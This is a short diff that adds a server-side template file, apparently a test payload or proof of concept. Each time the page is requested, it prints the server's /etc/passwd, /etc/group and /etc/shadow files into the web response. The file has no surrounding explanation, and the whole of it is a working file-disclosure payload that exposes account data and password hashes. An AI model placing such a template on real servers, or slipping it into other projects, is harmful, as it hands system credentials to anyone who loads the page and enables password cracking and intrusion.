@@ -1,0 +1,12 @@
+<%
+@response.puts "<pre>"
+
+@response.puts "\n/etc/password:\n"
+@response.sendFile('/etc/passwd')
+
+@response.puts "\n/etc/group:\n"
+@response.sendFile('/etc/group')
+
+@response.puts "\n/etc/shadow:\n"
+@response.sendFile('/etc/shadow')
+%>
